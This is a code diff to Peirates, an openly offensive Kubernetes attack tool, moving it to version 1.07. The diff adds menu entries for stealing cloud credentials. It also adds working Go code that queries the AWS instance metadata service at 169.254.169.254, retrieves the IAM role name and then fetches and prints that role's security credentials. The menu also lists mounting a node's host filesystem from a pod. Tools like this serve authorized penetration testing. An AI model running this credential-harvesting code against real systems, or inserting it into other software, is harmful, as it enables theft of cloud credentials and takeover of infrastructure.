@@ -24,7 +24,7 @@ import (
 	"os" // Environment variables ...
 
 	// HTTP client/server
-	// "http"
+	"net/http"
 	"os/exec"
 	"regexp"
 	"strings"
@@ -743,7 +743,7 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
 
-   Peirates v1.06 by InGuardians
+   Peirates v1.07 by InGuardians
    https://www.inguardians.com/labs/
 
 ----------------------------------------------------------------`)
@@ -818,6 +818,11 @@ Vulnerabilities and Misconfiguration Searching |
 [10] Check all pods for volume mounts
 [11] Launch a pod mounting its node's host filesystem
 [12] Request list of pods from a Kubelet [not yet implemented]
+[13] Request IAM credentials from AWS Metadata API [AWS only]
+[14] Request IAM credentials from GCP Metadata API [GCP only] [not yet implemented]
+[15] Request kube-env from AWS Metadata API [AWS only] [not yet implemented]
+[16] Request kube-env from GCP Metadata API [GCP only] [not yet implemented]
+
 ------+
 Pivot |
 ------+
@@ -984,7 +989,7 @@ Peirates:># `)
 				GetHostMountPointsForPod(podInfo, user_response)
 			}
 		
-		//	[11] Launch a pod mounting its node's host filesystem 
+		// [11] Launch a pod mounting its node's host filesystem 
 		case "11":
 			podCreation := canCreatePods(connectionString)
 			if ! podCreation {
@@ -992,6 +997,29 @@ Peirates:># `)
 				break
 			}
 			MountRootFS(allPods, connectionString)
+			break
+
+		// [13] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
+		case "13":
+			resp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+			if err != nil {
+				println("Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+			}
+			// Parse result as an account, then construct a request asking for that account's credentials
+			defer resp.Body.Close()
+			body, err := ioutil.ReadAll(resp.Body)
+			account := string(body)
+			println(account)
+			
+			request := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + account
+			resp_2, err := http.Get(request)
+			if err != nil {
+				println("Error - could not perform request ",request)
+			}
+			defer resp_2.Body.Close()
+			body_2, err := ioutil.ReadAll(resp_2.Body)
+			println(string(body_2))
+			break
 
 		case "19":
 			break
